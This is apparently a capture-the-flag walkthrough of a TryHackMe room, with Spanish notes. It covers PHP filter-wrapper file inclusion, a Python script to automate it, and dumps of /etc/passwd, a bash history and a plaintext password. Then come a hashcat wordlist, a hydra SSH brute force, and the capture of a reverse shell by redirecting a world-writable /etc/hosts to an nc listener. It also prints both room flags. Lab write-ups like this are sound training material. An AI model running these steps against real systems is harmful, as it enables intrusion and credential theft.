#lfi #phpwrappers

# Red
https://tryhackme.com/room/redisl33t



```
curl -s http://10.10.82.145/index.php?page=php://filter/convert.base64-encode/resource=index.php | base64 -d
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

- exploit para automatizar el LFI

```
import requests
import base64

while True :
    file = input("[+]File => ")
    response = requests.get(f'http://10.10.82.145/index.php?page=php://filter/convert.base$
    decoded = base64.b64decode(response.text)
    print(decoded.decode('utf-8'))

```

```
python exp.py /etc/passwd
[+]File => /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash

```

```
[+]File => /home/blue/.bash_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

```
/home/blue/.reminder
sup3r_p@s$w0rd!

```

- genramos la misma lista de passwords que se
```
echo "sup3r_p@s$w0rd!" > pass
hashcat --stdout pass -r /usr/local/share/doc/hashcat/rules/best64.rule > passlist.txt
..
cat passlist.txt 
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
sup3r_p@s$w0rd!4
...
```

- tenemos usuarios red y blue y usaremos esta lista para intentar entrar por ssh
```
hydra -l blue -P passlist.txt  ssh://10.10.82.145
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2023-07-19 02:35:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 77 login tries (l:1/p:77), ~5 tries per task
[DATA] attacking ssh://10.10.82.145:22/
[22][ssh] host: 10.10.82.145   login: blue   password: sup3r_p@s$w0!
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2023-07-19 02:35:17


sup3r_p@s$w0rd!9
```

- Iniciamos sesión y obtenemos `flag1`

```
ssh blue@10.10.82.145
The authenticity of host '10.10.82.145 (10.10.82.145)' can't be established.
ECDSA key fingerprint is SHA256:h0lfvIHjxKDq3cbM868yUuLXVq4Zr6C66rAv1bWgy6g.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.82.145' (ECDSA) to the list of known hosts.
blue@10.10.82.145's password: 
 
 

Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
blue@red:~$ 


blue@red:~$ ls
flag1
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}

```

- listamos procesos y vemos un reverse shell a `redrules.thm` pero que apunta a `192.168.0.1` ahi pondremos nuestra ip para recibir el shell
```
blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
blue@red:~$ 

blue@red:~$ ls -la /etc/hosts
-rw-r--rw- 1 root adm 242 Jul 19 02:51 /etc/hosts
blue@red:~$ 


echo "10.10.4.237 redrules.thm" >> /etc/hosts


root@ip-10-10-4-237:~# nc -lnvp 9001
Listening on [0.0.0.0] (family 0, port 9001)
Connection from 10.10.82.145 40708 received!
bash: cannot set terminal process group (17215): Inappropriate ioctl for device
bash: no job control in this shell
red@red:~$ cat flag2
cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
red@red:~$ 


THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}


```

